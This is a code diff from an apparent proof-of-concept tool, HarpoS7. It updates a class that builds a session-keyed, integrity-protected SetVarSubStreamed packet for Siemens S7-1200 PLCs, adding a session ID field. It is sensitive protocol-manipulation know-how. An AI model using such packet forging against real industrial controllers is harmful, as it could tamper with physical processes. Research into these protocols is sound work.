@@ -1,3 +1,4 @@
+using System.Buffers.Binary;
 using HarpoS7.Integrity;
 
 namespace HarpoS7.PoC.Packets;
@@ -6,10 +7,7 @@ public class SetVarSubStreamedRequest
 {
     private readonly byte[] _sessionKey;
     private readonly byte[] _blob;
-    private const int RealPlcIntegrityOffset = 0x0C;
-    private const int RealPlcDataOffset = 0x2C;
-    private const int RealPlcDataLength = 0x132;
-    private const int RealPlcBlobOffset = 0x61;
+    private readonly uint _sessionId;
 
     private static readonly byte[] S71200Data =
     [
@@ -45,24 +43,34 @@ public class SetVarSubStreamedRequest
 	    0x00, 0x00, 0x72, 0x03, 0x00, 0x00
     ];
     
-    public SetVarSubStreamedRequest(byte[] sessionKey, byte[] blob)
+    public SetVarSubStreamedRequest(byte[] sessionKey, byte[] blob, uint sessionId)
     {
         _sessionKey = sessionKey;
         _blob = blob;
+        _sessionId = sessionId;
     }
 
     public void WriteS71200(Stream stream)
     {
+        const int integrityOffset = 0x0C;
+        const int dataOffset = 0x2C;
+        const int dataLength = 0x132;
+        const int blobOffset = 0x61;
+        const int sessionIdOffset = 0x35;
+        
         Span<byte> buffer = stackalloc byte[S71200Data.Length];
         S71200Data.CopyTo(buffer);
         
+        BinaryPrimitives.WriteUInt32BigEndian(buffer[sessionIdOffset..], _sessionId);
+        BinaryPrimitives.WriteUInt32BigEndian(buffer[(sessionIdOffset + 5)..], _sessionId);
+        
         // Blob data
-        _blob.CopyTo(buffer[RealPlcBlobOffset..]);
+        _blob.CopyTo(buffer[blobOffset..]);
         
         // Integrity
         HarpoPacketDigest.CalculateDigest(
-            buffer[RealPlcIntegrityOffset..], 
-            buffer.Slice(RealPlcDataOffset, RealPlcDataLength), 
+            buffer[integrityOffset..], 
+            buffer.Slice(dataOffset, dataLength), 
             _sessionKey.AsSpan()
         );
         
